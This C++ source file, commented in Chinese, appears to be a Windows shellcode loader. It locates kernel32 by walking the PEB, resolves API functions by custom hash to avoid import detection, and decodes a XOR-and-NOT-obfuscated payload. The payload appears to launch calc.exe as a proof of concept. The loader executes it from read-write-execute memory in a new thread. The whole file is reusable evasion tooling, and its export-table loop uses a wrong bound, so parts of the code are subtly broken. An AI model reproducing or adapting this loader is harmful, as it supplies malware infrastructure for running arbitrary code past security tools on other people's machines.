#include <windows.h>
#include <stdio.h>
#include <iostream>
#include <vector>
#include <random>

typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR Buffer;
} UNICODE_STRING;

struct LDR_MODULE {
    LIST_ENTRY e[3];
    HMODULE base;
    void* entry;
    UINT size;
    UNICODE_STRING dllPath;
    UNICODE_STRING dllname;
};

typedef HMODULE(WINAPI* fnGetModuleHandleA)(
    LPCSTR lpModuleName
    );

typedef FARPROC(WINAPI* fnGetProcAddress)(
    HMODULE hModule,
    LPCSTR  lpProcName
    );

typedef PVOID(WINAPI* fnVirtualAlloc)(
    LPVOID lpAddress,
    SIZE_T dwSize,
    DWORD  flAllocationType,
    DWORD  flProtect
    );

typedef PVOID(WINAPI* fnCreateThread)(
    LPSECURITY_ATTRIBUTES   lpThreadAttributes,
    SIZE_T                  dwStackSize,
    LPTHREAD_START_ROUTINE  lpStartAddress,
    LPVOID                  lpParameter,
    DWORD                   dwCreationFlags,
    LPDWORD                 lpThreadId
    );

typedef PVOID(WINAPI* fnWaitForSingleObject)(
    HANDLE hHandle,
    DWORD  dwMilliseconds
    );

DWORD calcMyHash(char* data) {
    DWORD hash = 0x35;
    for (int i = 0; i < strlen(data); i++) {
        hash += data[i] + (hash << 1);
    }
    return hash;
}

static DWORD calcMyHashBase(LDR_MODULE* mdll) {
    char name[64];
    size_t i = 0;

    while (mdll->dllname.Buffer[i] && i < sizeof(name) - 1) {
        name[i] = (char)mdll->dllname.Buffer[i];
        i++;
    }
    name[i] = 0;
    return calcMyHash((char*)CharLowerA(name));
}

//从内存中获取Kernel32.dll的基地址
static HMODULE getKernel32(DWORD myHash) {
    HMODULE kernel32;

    // 获取PEB结构地址（在x64位系统中的偏移量，32位不同）
    INT_PTR peb = __readgsqword(0x60);

    auto modList = 0x18; // PEB_LDR_DATA结构中模块列表偏移量
    auto modListFlink = 0x18; // LDR_DATA_TABLE_ENTRY结构中下一个模块的偏移量
    auto kernelBaseAddr = 0x10; // LDR_DATA_TABLE_ENTRY结构中映像基地址的偏移量

    // 获取PEB_LDR_DATA结构中的模块列表指针
    auto mdllist = *(INT_PTR*)(peb + modList);

    // 获取第一个模块的LDR_DATA_TABLE_ENTRY结构中的下一个模块的指针
    auto mlink = *(INT_PTR*)(mdllist + modListFlink);

    // 获取kernel32.dll的基地址
    auto krnbase = *(INT_PTR*)(mlink + kernelBaseAddr);

    auto mdl = (LDR_MODULE*)mlink;

    // 遍历模块列表，查找kernel32.dll模块
    do {
        mdl = (LDR_MODULE*)mdl->e[0].Flink; // 获取下一个模块的LDR_MODULE结构指针
        if (mdl->base != nullptr) { // 确认模块的基地址不为空
            if (calcMyHashBase(mdl) == myHash) { // 比较模块基地址的hash值是否与目标值相同，即找到了kernel32.dll
                break;
            }
        }
    } while (mlink != (INT_PTR)mdl); // 如果遍历到的模块指针等于最开始的指针，则已遍历完整个模块列表

    kernel32 = (HMODULE)mdl->base; // 将kernel32.dll模块的基地址保存在kernel32变量中
    return kernel32;
}

//列出kernel32.dll中的api函数，计算hash与传入的目标hash对比
static LPVOID getAPIAddr(HMODULE h, DWORD myHash) {
    PIMAGE_DOS_HEADER img_dos_header = (PIMAGE_DOS_HEADER)h;
    PIMAGE_NT_HEADERS img_nt_header = (PIMAGE_NT_HEADERS)((LPBYTE)h + img_dos_header->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY img_edt = (PIMAGE_EXPORT_DIRECTORY)(
        (LPBYTE)h + img_nt_header->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
    PDWORD fAddr = (PDWORD)((LPBYTE)h + img_edt->AddressOfFunctions);
    PDWORD fNames = (PDWORD)((LPBYTE)h + img_edt->AddressOfNames);
    PWORD  fOrd = (PWORD)((LPBYTE)h + img_edt->AddressOfNameOrdinals);

    for (DWORD i = 0; i < img_edt->AddressOfFunctions; i++) {
        LPSTR pFuncName = (LPSTR)((LPBYTE)h + fNames[i]);

        if (calcMyHash(pFuncName) == myHash) {
            printf("successfully found! %s - %d\n", pFuncName, myHash);
            return (LPVOID)((LPBYTE)h + fAddr[fOrd[i]]);
        }
    }
    return nullptr;
}

int main() {
    HMODULE mod = getKernel32(56369259);
    fnGetModuleHandleA myGetModuleHandleA = (fnGetModuleHandleA)getAPIAddr(mod, 4038080516);
    fnGetProcAddress myGetProcAddress = (fnGetProcAddress)getAPIAddr(mod, 448915681);

    HMODULE hk32 = myGetModuleHandleA("kernel32.dll");
    fnVirtualAlloc myVirtualAlloc = (fnVirtualAlloc)myGetProcAddress(hk32, "VirtualAlloc");
    fnCreateThread myCreateThread = (fnCreateThread)myGetProcAddress(hk32, "CreateThread");
    fnWaitForSingleObject myWaitForSingleObject = (fnWaitForSingleObject)myGetProcAddress(hk32, "WaitForSingleObject");
    std::vector<unsigned char> xored_input = {
    0xbe,0x0a,0xc1,0xa6,0xb2,0xaa,0x82,0x42,0x42,0x42,0x03,0x13,0x03,0x12,0x10,0x13,0x14,0x0a,0x73,0x90,0x27,0x0a,0xc9,0x10,0x22,0x0a,0xc9,0x10,0x5a,0x0a,0xc9,0x10,0x62,0x0a,0xc9,0x30,0x12,0x0a,0x4d,0xf5,0x08,0x08,0x0f,0x73,0x8b,0x0a,0x73,0x82,0xee,0x7e,0x23,0x3e,0x40,0x6e,0x62,0x03,0x83,0x8b,0x4f,0x03,0x43,0x83,0xa0,0xaf,0x10,0x03,0x13,0x0a,0xc9,0x10,0x62,0xc9,0x00,0x7e,0x0a,0x43,0x92,0xc9,0xc2,0xca,0x42,0x42,0x42,0x0a,0xc7,0x82,0x36,0x25,0x0a,0x43,0x92,0x12,0xc9,0x0a,0x5a,0x06,0xc9,0x02,0x62,0x0b,0x43,0x92,0xa1,0x14,0x0a,0xbd,0x8b,0x03,0xc9,0x76,0xca,0x0a,0x43,0x94,0x0f,0x73,0x8b,0x0a,0x73,0x82,0xee,0x03,0x83,0x8b,0x4f,0x03,0x43,0x83,0x7a,0xa2,0x37,0xb3,0x0e,0x41,0x0e,0x66,0x4a,0x07,0x7b,0x93,0x37,0x9a,0x1a,0x06,0xc9,0x02,0x66,0x0b,0x43,0x92,0x24,0x03,0xc9,0x4e,0x0a,0x06,0xc9,0x02,0x5e,0x0b,0x43,0x92,0x03,0xc9,0x46,0xca,0x0a,0x43,0x92,0x03,0x1a,0x03,0x1a,0x1c,0x1b,0x18,0x03,0x1a,0x03,0x1b,0x03,0x18,0x0a,0xc1,0xae,0x62,0x03,0x10,0xbd,0xa2,0x1a,0x03,0x1b,0x18,0x0a,0xc9,0x50,0xab,0x15,0xbd,0xbd,0xbd,0x1f,0x0a,0xf8,0x43,0x42,0x42,0x42,0x42,0x42,0x42,0x42,0x0a,0xcf,0xcf,0x43,0x43,0x42,0x42,0x03,0xf8,0x73,0xc9,0x2d,0xc5,0xbd,0x97,0xf9,0xb2,0xf7,0xe0,0x14,0x03,0xf8,0xe4,0xd7,0xff,0xdf,0xbd,0x97,0x0a,0xc1,0x86,0x6a,0x7e,0x44,0x3e,0x48,0xc2,0xb9,0xa2,0x37,0x47,0xf9,0x05,0x51,0x30,0x2d,0x28,0x42,0x1b,0x03,0xcb,0x98,0xbd,0x97,0x21,0x23,0x2e,0x21,0x6c,0x27,0x3a,0x27,0x42,0xbc,0xbd
    };
    // 解密代码
    // 1. 从变换后的字节数组中取出随机字节，并将其移除
    unsigned char end_byte = xored_input.back();
    xored_input.pop_back();

    // 2. 将变换后的字节数组中除最后一个字节外的所有字节与随机字节进行XOR，得到NOT操作之前的字节数组
    std::vector<unsigned char> not_input_2;
    for (auto b : xored_input) {
        not_input_2.push_back(b ^ end_byte);
    }

    // 3. 进行NOT操作，得到原始的字节数组
    std::vector<unsigned char> output;
    for (auto b : not_input_2) {
        output.push_back(~b);
    }
    output.pop_back();
    unsigned char* my_payload = new unsigned char[output.size() + 1];
    std::copy(output.begin(), output.end(), my_payload);
    my_payload[output.size()] = '\0';
    if (output.back() == 0x00) {
        my_payload[output.size()] = '\0';
    }
    for (size_t i = 0; i < output.size(); ++i) {
        std::cout << std::hex << (int)my_payload[i] << " ";
    }
    std::cout << std::endl;
    std::cout << sizeof(my_payload) << std::endl;
    PVOID lb = myVirtualAlloc(0, output.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    memcpy(lb, my_payload, output.size());

    HANDLE th = myCreateThread(NULL, 0, (PTHREAD_START_ROUTINE)lb, NULL, 0, NULL);
    myWaitForSingleObject(th, INFINITE);
}